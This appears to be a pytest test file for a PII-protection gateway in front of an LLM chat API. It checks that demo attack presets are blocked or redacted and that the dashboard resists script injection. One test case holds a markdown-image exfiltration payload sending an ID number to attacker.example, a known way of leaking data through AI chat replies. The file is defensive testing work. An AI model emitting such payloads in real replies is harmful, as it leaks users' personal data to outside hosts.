import json
import re

import pytest
from fastapi.testclient import TestClient

from gateway.attacks import leaks
from gateway.audit import AuditLog
from gateway.demo_app import create_demo_app, presets


@pytest.fixture
def client(tmp_path):
    return TestClient(create_demo_app(eval_path=str(tmp_path / "missing.json"), audit=AuditLog(salt="t")))


def run_preset(client, p):
    """Mirror of the dashboard's JavaScript, so the page and the tests agree."""
    out = {}
    msgs = lambda texts: [{"role": "user", "content": t} for t in texts]
    if p["direct"]:
        before = client.get("/demo/model-input").json()["calls"]
        reply = client.post("/demo/direct", json={"messages": msgs(p["texts"])}).json()["reply"]
        after = client.get("/demo/model-input").json()
        seen = "\n".join(m["content"] for m in after["last"]) if after["calls"] > before else ""
        out["without"] = leaks(seen if p["where"] == "model" else reply, p["watch"])
    else:
        out["without"] = None
    for s in p["setup"]:
        client.post("/v1/chat/completions", headers={"X-Session-Id": s["sid"]}, json={"messages": msgs(s["texts"])})
    before = client.get("/demo/model-input").json()["calls"]
    r = client.post("/v1/chat/completions", headers={"X-Session-Id": p["sid"]}, json={"messages": msgs(p["texts"])})
    after = client.get("/demo/model-input").json()
    called = after["calls"] > before
    if r.status_code != 200:
        out["with"] = "blocked" if not called else "error"
    else:
        seen = "\n".join(m["content"] for m in after["last"]) if called else ""
        reply = r.json()["choices"][0]["message"]["content"]
        out["with"] = leaks(seen if p["where"] == "model" else reply, p["watch"])
    return out


EXPECTED = {
    "paste": (True, False), "otp": (True, "blocked"), "obfuscated": (True, False),
    "replay": (None, False), "injection": (True, False), "exfil": (True, False),
}


def test_every_preset_gives_the_expected_verdict_with_and_without_the_gateway(client):
    ps = presets()
    assert {p["id"] for p in ps} == set(EXPECTED)
    for p in ps:
        got = run_preset(client, p)
        assert (got["without"], got["with"]) == EXPECTED[p["id"]], p["id"]


def test_presets_endpoint_matches_function(client):
    assert client.get("/demo/presets").json() == presets()


def test_dashboard_served_with_admin_key_injected(monkeypatch, tmp_path):
    monkeypatch.setenv("PII_ADMIN_KEY", 'k"</script>')
    c = TestClient(create_demo_app(eval_path=str(tmp_path / "x.json")))
    r = c.get("/dashboard")
    assert r.status_code == 200 and "__ADMIN_KEY__" not in r.text
    assert "</script>" not in r.text.split("const ADMIN_KEY")[1].split(";")[0]   # cannot break out of the script tag
    assert c.get("/", follow_redirects=False).headers["location"] == "/dashboard"


def test_default_admin_key_works_for_the_audit_endpoints(client):
    assert client.get("/audit/stats", headers={"X-Admin-Key": "demo"}).status_code == 200
    assert client.get("/audit/stats").status_code == 401


def test_dashboard_page_needs_no_external_resources():
    html = open("gateway/dashboard.html", encoding="utf-8").read()
    assert not re.search(r"""(src|href)\s*=\s*["']?(https?:)?//""", html, re.I)
    assert "@import" not in html and not re.search(r"url\(\s*['\"]?https?:", html, re.I)


def test_dashboard_never_uses_innerhtml():
    html = open("gateway/dashboard.html", encoding="utf-8").read()
    assert "innerHTML" not in html and "insertAdjacentHTML" not in html and "document.write" not in html


def test_direct_endpoint_bypasses_the_gateway_on_purpose(client):
    r = client.post("/demo/direct", json={"messages": [{"role": "user", "content": "aadhaar 2384 1295 6108"}]})
    assert "2384 1295 6108" in r.json()["reply"]
    assert client.get("/demo/model-input").json()["last"][0]["content"] == "aadhaar 2384 1295 6108"


def test_model_input_is_none_before_any_call(client):
    assert client.get("/demo/model-input").json() == {"calls": 0, "last": None}


def test_attacks_endpoint(client):
    rows = client.get("/demo/attacks").json()
    assert len(rows) == 6 and all(r["gateway"] in (False, None) for r in rows)


def test_eval_404_then_200(tmp_path):
    path = tmp_path / "eval.json"
    c = TestClient(create_demo_app(eval_path=str(path)))
    assert c.get("/demo/eval").status_code == 404
    path.write_text(json.dumps({"hello": "world"}))
    assert c.get("/demo/eval").json() == {"hello": "world"}


def test_reset_clears_the_audit_log(client):
    client.post("/v1/chat/completions", json={"messages": [{"role": "user", "content": "hi"}]})
    assert client.get("/audit/stats", headers={"X-Admin-Key": "demo"}).json()["requests"] == 1
    client.post("/demo/reset")
    assert client.get("/audit/stats", headers={"X-Admin-Key": "demo"}).json()["requests"] == 0


# --------------------------------------------------------------- page JavaScript vs Python
import shutil
import subprocess

CASES = [
    ("my aadhaar 2384 1295 6108", ["238412956108"], True),
    ("२३८४ १२९५ ६१०८", ["238412956108"], True),
    ("2384​1295​6108", ["238412956108"], True),
    ("abcpk1234d", ["ABCPK1234D"], True),
    ("order 111122223333", ["238412956108"], False),
    ("", ["238412956108"], False),
    ("![r](https://attacker.example/c?d=2384 1295 6108)", ["238412956108"], True),
    ("no secrets here", ["ABCPK1234D", "238412956108"], False),
]


@pytest.mark.skipif(shutil.which("node") is None, reason="node not installed")
def test_javascript_leak_check_agrees_with_python():
    html = open("gateway/dashboard.html", encoding="utf-8").read()
    m = re.search(r"/\* canonical form.*?const leaks = [^\n]*\n", html, re.S)
    assert m, "leak helpers not found in dashboard.html"
    script = m.group(0) + "\nconst cases = JSON.parse(process.argv[1]);\n" \
        "console.log(JSON.stringify(cases.map(([t, s]) => leaks(t, s))));\n"
    out = subprocess.run(["node", "-e", script, json.dumps([[t, s] for t, s, _ in CASES])],
                         capture_output=True, text=True, timeout=30, check=True).stdout
    js = json.loads(out)
    assert js == [expected for _, _, expected in CASES]
    assert js == [leaks(t, s) for t, s, _ in CASES]
